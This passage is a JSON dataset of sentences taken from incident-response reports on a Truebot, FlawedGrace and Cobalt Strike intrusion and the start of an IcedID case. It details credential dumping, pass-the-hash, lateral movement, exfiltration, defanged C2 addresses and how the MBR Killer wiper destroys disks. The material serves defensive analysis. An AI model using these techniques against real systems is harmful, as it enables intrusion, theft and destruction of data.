        "text": "Shortly after execution, the Truebot malware copied the initial malware to a new location renaming itself to RuntimeBroker.exe, masquerading as an executable responsible for managing certain application permissions.",
        "type": "",
        "report": "r-dfir-1",
        "line": 95,
        "index": 3578
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S96",
        "text": "As covered in the execution section, FlawedGrace uses a number of techniques to perform evasion, including encoding, encryption, and storing payloads in the registry.",
        "type": "",
        "report": "r-dfir-1",
        "line": 96,
        "index": 3579
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S97",
        "text": "When executing, command-line data was encoded.",
        "type": "",
        "report": "r-dfir-1",
        "line": 97,
        "index": 3580
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S98",
        "text": "See the Execution section for a breakdown of the encoding.",
        "type": "",
        "report": "r-dfir-1",
        "line": 98,
        "index": 3581
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S99",
        "text": "During runtime, the FlawedGrace malware decrypts the RC4 encrypted registry stored payload:\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 99,
        "index": 3582
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S100",
        "text": "We observed process injection by all three malware families in this intrusion.",
        "type": "",
        "report": "r-dfir-1",
        "line": 100,
        "index": 3583
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S101",
        "text": "First, Truebot used it to inject the Cobalt Strike payload into a cmd.exe process.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 101,
        "index": 3584
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S102",
        "text": "Reviewing memory dumps, the injected MZ header for the Cobalt Strike beacon is easily observable in the injected cmd.exe process.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 102,
        "index": 3585
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S103",
        "text": "Cobalt Strike was not the only injection with observable headers, each svchost.exe and msiexec.exe also contained telltale injection signs like PAGE_EXECUTE_READWRITE protection and MZ file headers.",
        "type": "",
        "report": "r-dfir-1",
        "line": 103,
        "index": 3586
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S104",
        "text": "Standard Cobalt Strike named pipes using the postex_* patterns were observed throughout the intrusion.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 104,
        "index": 3587
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S105",
        "text": "Some Registry Items were removed during the FlawedGrace PowerShell execution, specifically the items stored in HKLM:\\SOFTWARE\\2\\:\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 105,
        "index": 3588
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S106",
        "text": "File removal was observed with AdFind.exe being removed by the threat actors as well as Cobalt Strike beacon removal, after being used for lateral movement.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 106,
        "index": 3589
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S107",
        "text": "Approximately one hour after the initial infection, we observed the threat actors using a remote dumping tool to extract credentials via the registry hives.",
        "type": "",
        "report": "r-dfir-1",
        "line": 107,
        "index": 3590
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S108",
        "text": "At this time, we cannot confidently name the tool that they used.",
        "type": "",
        "report": "r-dfir-1",
        "line": 108,
        "index": 3591
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S109",
        "text": "The logs of the credential access activity resemble those of secretsdump , which is a tool that is part of the Impacket library.",
        "type": "",
        "report": "r-dfir-1",
        "line": 109,
        "index": 3592
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S110",
        "text": "We noticed the creation of two temporary files in the C:\\Windows\\System32\\ directory.",
        "type": "",
        "report": "r-dfir-1",
        "line": 110,
        "index": 3593
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S111",
        "text": "The names of these files consisted of eight randomly generated characters.",
        "type": "",
        "report": "r-dfir-1",
        "line": 111,
        "index": 3594
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S112",
        "text": "Prior to that, a service called \u201cRemoteRegistry\u201d was instructed to start.",
        "type": "",
        "report": "r-dfir-1",
        "line": 112,
        "index": 3595
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S113",
        "text": "The Remote Registry allows administrators to access, modify, and manage the registry settings of other computers on a network.",
        "type": "",
        "report": "r-dfir-1",
        "line": 113,
        "index": 3596
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S114",
        "text": "Once again, an example of this approach can be seen through secretsdump ( secretsdump.py#L374 ).\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 114,
        "index": 3597
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S115",
        "text": "We believe that the threat actors utilized an older version of the impacket Library.",
        "type": "",
        "report": "r-dfir-1",
        "line": 115,
        "index": 3598
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S116",
        "text": "This is because as of May 4th, 2023, version 0.10.0 modified the location where the registry hives would extract.",
        "type": "",
        "report": "r-dfir-1",
        "line": 116,
        "index": 3599
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S117",
        "text": "They are now saved as temp files under C:\\Windows\\Temp directory.",
        "type": "",
        "report": "r-dfir-1",
        "line": 117,
        "index": 3600
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S118",
        "text": "However, as with this case, we observed the temp files under C:\\Windows\\System32, which indicates the use of an older version of impacket.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 118,
        "index": 3601
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S119",
        "text": "After reviewing the Security event logs for event ID 4624 and the Sysmon event logs (event ID 1 & 10) on the beachhead host, we have determined that the attackers utilized Pass-The-Hash to run commands on remote hosts as the local administrator user.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 119,
        "index": 3602
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S120",
        "text": "When considering this evidence, the time sequence is a crucial factor.",
        "type": "",
        "report": "r-dfir-1",
        "line": 120,
        "index": 3603
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S121",
        "text": "To prevent false positives, defenders can group related events together based on their time of execution.",
        "type": "",
        "report": "r-dfir-1",
        "line": 121,
        "index": 3604
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S122",
        "text": "However, we have also included specific Sigma rules that are capable of identifying these execution patterns in isolation.",
        "type": "",
        "report": "r-dfir-1",
        "line": 122,
        "index": 3605
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S123",
        "text": "Please refer to these rules in the Detections section of this report.",
        "type": "",
        "report": "r-dfir-1",
        "line": 123,
        "index": 3606
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S124",
        "text": "We also observed the threat actors utilizing for loops to iterate through text files located in the C:\\ProgramData directory.",
        "type": "",
        "report": "r-dfir-1",
        "line": 124,
        "index": 3607
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S125",
        "text": "These files contained the hostname of all workstations and servers within the network environment.",
        "type": "",
        "report": "r-dfir-1",
        "line": 125,
        "index": 3608
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S126",
        "text": "The aim of this loop was to execute discovery commands using ping to locate live endpoints and net view to enumerate their open shares.",
        "type": "",
        "report": "r-dfir-1",
        "line": 126,
        "index": 3609
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S127",
        "text": "In addition, they used the dir command to test the feasibility of connecting to remote servers within the network through the local administrator\u2019s account.",
        "type": "",
        "report": "r-dfir-1",
        "line": 127,
        "index": 3610
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S128",
        "text": "In addition to using net view to find open shares, the attackers also examined the registry of the local host and saved a list of all mapped shares in a text file called 1.txt.",
        "type": "",
        "report": "r-dfir-1",
        "line": 128,
        "index": 3611
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S129",
        "text": "We also observed them using the wmic command to execute the same action on a remote host.",
        "type": "",
        "report": "r-dfir-1",
        "line": 129,
        "index": 3612
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S130",
        "text": "They later viewed and deleted the text file using the type and del commands respectively.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 130,
        "index": 3613
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S131",
        "text": "To check the status of the antimalware software that is installed, they used PowerShell along with the Get-MpComputerStatus cmdlet.",
        "type": "",
        "report": "r-dfir-1",
        "line": 131,
        "index": 3614
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S132",
        "text": "This command was run on multiple hosts in the environment.",
        "type": "",
        "report": "r-dfir-1",
        "line": 132,
        "index": 3615
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S133",
        "text": "We believe the execution of this command came through atexec.py, which is part of the impacket collection.",
        "type": "",
        "report": "r-dfir-1",
        "line": 133,
        "index": 3616
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S134",
        "text": "AdFind was used in this intrusion, however, the threat actors limited the output only to collect operating system information and specific attributes from the domain user objects.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 134,
        "index": 3617
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S135",
        "text": "We also observed some other miscellaneous commands that we tend to see in every intrusion.",
        "type": "",
        "report": "r-dfir-1",
        "line": 135,
        "index": 3618
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S136",
        "text": "These discovery commands collected information about the administrator groups and users.",
        "type": "",
        "report": "r-dfir-1",
        "line": 136,
        "index": 3619
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S137",
        "text": "Although, there was one notable use of the tasklist command where threat actors used the /S parameter to retrieve the list of currently running processes from remote hosts.",
        "type": "",
        "report": "r-dfir-1",
        "line": 137,
        "index": 3620
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S138",
        "text": "The threat actors predominately used Cobalt Strike\u2019s jump psexec module to move to new hosts.",
        "type": "",
        "report": "r-dfir-1",
        "line": 138,
        "index": 3621
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S139",
        "text": "The event ID 7045 (A new service was installed in the system) in System.evtx showed clear evidence of the malicious service being installed.",
        "type": "",
        "report": "r-dfir-1",
        "line": 139,
        "index": 3622
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S140",
        "text": "The DFIR Report\u2019s defender\u2019s guide to Cobalt Strike discusses this in further detail.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 140,
        "index": 3623
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S141",
        "text": "As seen below, when filtered to these events, we observed the threat actor moving to a new system every 5-20 minutes.",
        "type": "",
        "report": "r-dfir-1",
        "line": 141,
        "index": 3624
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S142",
        "text": "As we mentioned in the discovery phase, threat actors also used atexec to execute commands on remote hosts.",
        "type": "",
        "report": "r-dfir-1",
        "line": 142,
        "index": 3625
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S143",
        "text": "Impacket\u2019s atexec module allows the remote execution of commands on a Windows system by leveraging the Task Scheduler service.",
        "type": "",
        "report": "r-dfir-1",
        "line": 143,
        "index": 3626
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S144",
        "text": "The module registers a task on a remote system that would execute the instructed command.",
        "type": "",
        "report": "r-dfir-1",
        "line": 144,
        "index": 3627
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S145",
        "text": "The task would then be deleted upon successful execution.",
        "type": "",
        "report": "r-dfir-1",
        "line": 145,
        "index": 3628
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S146",
        "text": "The example below is from the Security event logs, event ID 4698.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 146,
        "index": 3629
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S147",
        "text": "To showcase the hardcoded lines of code responsible for the observed execution flow, we have included a snippet from atexec\u2019s official GitHub page in the screenshot above.",
        "type": "",
        "report": "r-dfir-1",
        "line": 147,
        "index": 3630
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S148",
        "text": "Threat actors used Cobalt Strike to facilitate the execution of this module.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 148,
        "index": 3631
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S149",
        "text": "In some other cases, we saw threat actors executing the below command from the beachhead host toward a number of remote hosts.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 149,
        "index": 3632
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S150",
        "text": "This command uses Windows Management Instrumentation CommandLine (WMIC) to remotely retrieve the executable paths of all running processes from a number of remote hosts.",
        "type": "",
        "report": "r-dfir-1",
        "line": 150,
        "index": 3633
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S151",
        "text": "/node:<remote host>: specifies the remote host.",
        "type": "",
        "report": "r-dfir-1",
        "line": 151,
        "index": 3634
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S152",
        "text": "process: represents the WMI class to be queried; in this case, it\u2019s related to running processes on the target system.",
        "type": "",
        "report": "r-dfir-1",
        "line": 152,
        "index": 3635
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S153",
        "text": "get executablepath: is to retrieve the property \u2018ExecutablePath\u2019, which contains the complete path to the executable for each running process.",
        "type": "",
        "report": "r-dfir-1",
        "line": 153,
        "index": 3636
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S154",
        "text": "We\u2019ve created a chart displaying the times (UTC) when threat actors were active in the network.",
        "type": "",
        "report": "r-dfir-1",
        "line": 154,
        "index": 3637
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S155",
        "text": "The data is based on a sample of affected hosts, but the pattern of activity remained consistent throughout the intrusion.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 155,
        "index": 3638
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S156",
        "text": "Throughout the intrusion, the attackers staged results from their discovery within either the temporary directory or C:\\ProgramData.",
        "type": "",
        "report": "r-dfir-1",
        "line": 156,
        "index": 3639
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S157",
        "text": "As a reminder, the following discovery commands redirected their results to C:\\ProgramData\\hosts_live.txt and C:\\ProgramData\\servers_live.txt.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 157,
        "index": 3640
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S158",
        "text": "Additionally, populated and collected files included:\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 158,
        "index": 3641
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S159",
        "text": "The extensive creation of text files (.txt and .csv) within the C:\\ProgramData directory provides detection and hunting opportunities as legitimate software commonly leverages sub-folders of this directory.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 159,
        "index": 3642
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S160",
        "text": "Communication to the Truebot C2 server at 45.182.189[.]71 began shortly after the execution of the initial access executable.",
        "type": "",
        "report": "r-dfir-1",
        "line": 160,
        "index": 3643
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S161",
        "text": "This connection, however, only lasted for around two hours on the beachhead host, and activity ceased after the Cobalt Strike beacon payload was loaded on the host.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 161,
        "index": 3644
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S162",
        "text": "Looking at memory collected from the beachhead host, we can observe the connection to the Truebot command and control server made by Runtimebroker.exe, the renamed executable copied from the initial malware payload.",
        "type": "",
        "report": "r-dfir-1",
        "line": 162,
        "index": 3645
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S163",
        "text": "The FlawedGrace malware is unlike any command and control we\u2019ve covered in previous reports as it uses a custom binary protocol as opposed to the more common usage of application layer protocols like HTTP/s, RDP, or SSH.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 163,
        "index": 3646
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S164",
        "text": "Over the course of the intrusion, the threat actors pivoted to several command and control addresses with times of overlap between several C2 addresses.",
        "type": "",
        "report": "r-dfir-1",
        "line": 164,
        "index": 3647
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S165",
        "text": "This activity took place several times over the course of the intrusion.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 165,
        "index": 3648
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S166",
        "text": "As well as pivoting between command and control servers, the threat actors started communication from various hosts over the course of the intrusion with no host maintaining constant beaconing.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 166,
        "index": 3649
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S167",
        "text": "As this malware uses a custom protocol, normal indicators like SSL certificate or JA3 were not present.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 167,
        "index": 3650
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S168",
        "text": "Traces of command and control activity were present in memory on several hosts from the beachhead to multiple servers.",
        "type": "",
        "report": "r-dfir-1",
        "line": 168,
        "index": 3651
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S169",
        "text": "Most no longer showed the responsible process, but at least one host had an active connection from an injected svchost.exe process to FlawedGrace command and control visible.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 169,
        "index": 3652
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S170",
        "text": "During the first day of the intrusion, we observed a network signature hit for RDP tunneling from one of the FlawedGrace command and control servers, but due to no follow-up activity, it would appear that this did not function properly for the threat actors.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 170,
        "index": 3653
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S171",
        "text": "This likely also explains the removal of the local user account that had been added to the Remote Desktop Users group.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 171,
        "index": 3654
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S172",
        "text": "Cobalt Strike, unlike the other two malware families observed, remained in constant communication with its command and control server after the first beacon was loaded until the end of the intrusion.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 172,
        "index": 3655
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S173",
        "text": "While the Cobalt Strike command and control stayed active over the intrusion the threat actors did selectively deploy and remove it on hosts with only the beachhead host maintaining beaconing activity for the whole duration.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 173,
        "index": 3656
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S174",
        "text": "Cobalt Strike beacon configuration:\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 174,
        "index": 3657
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S175",
        "text": "On the second day of the intrusion, a connection from a file server began to the IP 139.60.160[.]166 over port 4433.",
        "type": "",
        "report": "r-dfir-1",
        "line": 175,
        "index": 3658
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S176",
        "text": "The process tree indicates the FlawedGrace malware injected into svchost and msiexec on the file server and initiated the transfer.",
        "type": "",
        "report": "r-dfir-1",
        "line": 176,
        "index": 3659
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S177",
        "text": "Other reports have indicated Truebot/FlawedGrace intrusions have deployed custom tools for exfiltration.",
        "type": "",
        "report": "r-dfir-1",
        "line": 177,
        "index": 3660
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S178",
        "text": "We did not observe any additional binary dropped to disk to perform the exfiltration.",
        "type": "",
        "report": "r-dfir-1",
        "line": 178,
        "index": 3661
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S179",
        "text": "As the FlawedGrace process established the TCP connection, we assess with moderate confidence the capability was included in the FlawedGrace malware itself.",
        "type": "",
        "report": "r-dfir-1",
        "line": 179,
        "index": 3662
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S180",
        "text": "Two distinct exfiltration periods were observed taking place around two hours apart.",
        "type": "",
        "report": "r-dfir-1",
        "line": 180,
        "index": 3663
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S181",
        "text": "The network traffic was not sent over a TLS connection but just the TCP protocol.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 181,
        "index": 3664
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S182",
        "text": "This data was not observable in plain text, indicating likely other obfuscation/encryption methods in use.",
        "type": "",
        "report": "r-dfir-1",
        "line": 182,
        "index": 3665
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S183",
        "text": "Using flow data between the two sessions, we were able to verify gigabytes of data were exfiltrated.",
        "type": "",
        "report": "r-dfir-1",
        "line": 183,
        "index": 3666
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S184",
        "text": "Within four hours of the completed exfiltration, merely 29 hours after initial execution, the threat actors started deploying MBR Killer (aka KillDisk), well-known for its usage during the 2016 Banco de Chile attack.",
        "type": "",
        "report": "r-dfir-1",
        "line": 184,
        "index": 3667
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S185",
        "text": "As documented by Flashpoint, the wiper is an NSIS (Nullsoft Scriptable Install System) script capable of wiping a device\u2019s MBR (Master Boot Record), MFT (Master File Table), VBR (Volume Boot Record) and EBR (Extended Boot Record) before forcing a reboot to render a device inoperable.",
        "type": "",
        "report": "r-dfir-1",
        "line": 185,
        "index": 3668
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S186",
        "text": "During this destructive stage, the threat actors named the file C:\\ProgramData\\chrome.exe on the beachhead, while on other servers the C:\\Windows\\Temp\\[0-9a-f]{32}.exe naming pattern was used.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 186,
        "index": 3669
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S187",
        "text": "As a defense-evasion technique, MBR Killer has been observed using patched NSIS installers relying on non-standard headers.",
        "type": "",
        "report": "r-dfir-1",
        "line": 187,
        "index": 3670
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S188",
        "text": "Once the payload signature is corrected, NSIS decompilers such as 7zip (9.34 \u2013 15.05) are able to extract the malicious NSIS script.",
        "type": "",
        "report": "r-dfir-1",
        "line": 188,
        "index": 3671
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S189",
        "text": "This customization provides defenders with a detection opportunity as outlined within the hereafter-provided YARA rules.",
        "type": "",
        "report": "r-dfir-1",
        "line": 189,
        "index": 3672
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S190",
        "text": "During initialization, MBR Killer visually hides itself by moving off-screen.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 190,
        "index": 3673
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S191",
        "text": "Once hidden, the malicious installer verifies whether it is being emulated by temporarily patching the native Windows ZwClose function (part of ntdll.dll) to immediately succeed with STATUS_SUCCESS before closing a dummy handle through kernel32::CloseHandle(0x12345678) and validating that, although the handle was invalid, the CloseHandle method succeeded.",
        "type": "",
        "report": "r-dfir-1",
        "line": 191,
        "index": 3674
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S192",
        "text": "If the anti-analysis check succeeds, the script issues the HideWindow NSIS call, which hides the installer and proceeds to validate the existence of the first physical drive \\\\.\\PHYSICALDRIVE0 by opening it.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 192,
        "index": 3675
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S193",
        "text": "Once the first \\\\.\\PHYSICALDRIVE0 drive opened, MBR Killer conditionally attempts to wipe:\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 193,
        "index": 3676
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S194",
        "text": "- MFT (Master File Table) contains metadata about files and directories, such as names, dates and sizes.",
        "type": "",
        "report": "r-dfir-1",
        "line": 194,
        "index": 3677
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S195",
        "text": "- VBR (Volume Boot Record) contains, amongst others, code required to bootstrap the operating system.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 195,
        "index": 3678
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S196",
        "text": "- EBR (Extended Boot Record) contains information to describe logical partitions.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 196,
        "index": 3679
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S197",
        "text": "MBR Killer then proceeds to wipe the MBR (Master Boot Record) three times by writing 512 empty bytes at offset 0 and attempts to repeat the wiping on the next available disk (\\\\.\\PHYSICALDRIVE1, \\\\.\\PHYSICALDRIVE2, \u2026).\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 197,
        "index": 3680
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S198",
        "text": "Once the MBR Killer wiper has done its damage, the script attempts to modify its process privileges to enable the SeShutdownPrivilege and initiates a reboot.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 198,
        "index": 3681
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S199",
        "text": "To initiate the reboot, MBR Killer calls ExitWindowsEx with:\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 199,
        "index": 3682
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S200",
        "text": "- EWX_REBOOT (0x2) to cause a reboot\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 200,
        "index": 3683
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S201",
        "text": "- EWX_FORCE (0x4) to try to force the operation\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 201,
        "index": 3684
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S202",
        "text": "- SHTDN_REASON_MAJOR_SOFTWARE (0x00030000) to indicate it was software-caused",
        "type": "",
        "report": "r-dfir-1",
        "line": 202,
        "index": 3685
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S203",
        "text": "- SHTDN_REASON_MINOR_UPGRADE (0x00000003) to indicate the software reason is an upgrade.",
        "type": "",
        "report": "r-dfir-1",
        "line": 203,
        "index": 3686
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S204",
        "text": "Worth noting is that even-though the MBR Killer script attempts a reboot, the same functionality is implemented within the NSIS installer itself.",
        "type": "",
        "report": "r-dfir-1",
        "line": 204,
        "index": 3687
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S205",
        "text": "Upon reboot, the affected machines were rendered inoperable.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 205,
        "index": 3688
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S206",
        "text": "While the wiper we observed was not packed using VM-Protect, the decompiled script is near-similar to the 2016 Banco de Chile wiper component and indicates the source-code was likely shared.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 206,
        "index": 3689
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S207",
        "text": "Supporting this theory was the change in NSIS version from v3.0b2 (Released on August 4th, 2015) to v3.04 (Released on December 15th, 2018) alongside the removal of the MBR Killer branding.",
        "type": "",
        "report": "r-dfir-1",
        "line": 207,
        "index": 3690
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S208",
        "text": "While the 2016 sample was bzip2-compressed, the recompiled version now uses the more performant zlib compression.\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 208,
        "index": 3691
    },
    {
        "id": "dfir-reports-filtered/r-dfir-1.md:::S209",
        "text": "Functionality-wise, our newly observed wiper performs a justified reboot (0x2, EWX_REBOOT) whereas the Banco de Chile variant merely performed an unjustified shut-down (0x8, EWX_POWEROFF).\n",
        "type": "",
        "report": "r-dfir-1",
        "line": 209,
        "index": 3692
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S0",
        "text": "This intrusion began with a malicious Excel document.",
        "type": "",
        "report": "r-dfir-2",
        "line": 0,
        "index": 3693
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S1",
        "text": "We assess with medium-high confidence that this document was delivered as part of a malicious email campaign during the first half of October 2022, based on public reporting that overlaps with multiple characteristics observed.",
        "type": "",
        "report": "r-dfir-2",
        "line": 1,
        "index": 3694
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S2",
        "text": "Upon opening the Excel document, the macros would be executed when a user clicked on an embedded image.",
        "type": "",
        "report": "r-dfir-2",
        "line": 2,
        "index": 3695
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S3",
        "text": "The macro code was responsible for downloading and writing an IcedID DLL payload to disk.",
        "type": "",
        "report": "r-dfir-2",
        "line": 3,
        "index": 3696
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S4",
        "text": "The macro then used a renamed rundll32 binary to execute the malicious DLL.",
        "type": "",
        "report": "r-dfir-2",
        "line": 4,
        "index": 3697
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S5",
        "text": "After reaching out to the initial command and control server, automated discovery ran from the IcedID process around two minutes after execution.",
        "type": "",
        "report": "r-dfir-2",
        "line": 5,
        "index": 3698
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S6",
        "text": "This discovery used the same suite of Microsoft binaries as we have previously reported for the IcedID malware family.",
        "type": "",
        "report": "r-dfir-2",
        "line": 6,
        "index": 3699
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S7",
        "text": "At this time, the malware also established persistence on the beachhead host using a scheduled task.\n",
